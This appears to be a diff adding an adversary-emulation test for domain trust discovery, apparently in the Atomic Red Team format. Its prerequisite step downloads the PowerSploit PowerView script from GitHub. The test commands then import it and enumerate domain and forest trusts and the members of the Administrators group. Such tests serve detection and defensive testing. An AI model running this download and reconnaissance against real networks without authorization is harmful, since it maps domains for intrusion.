@@ -1,0 +1,19 @@
+#TechniqueName: Domain Trust Discovery
+#AtomicTestName: Powershell enumerate domains and forests
+#Language: ps1
+
+#get_prereq_commands
+Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1" -OutFile "$env:TEMP\PowerView.ps1"
+
+
+#prereq_commands
+if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit 1}
+
+
+#commands
+Import-Module "$env:TEMP\PowerView.ps1"
+Get-NetDomainTrust
+Get-NetForestTrust
+Get-ADDomain
+Get-ADGroupMember Administrators -Recursive
+
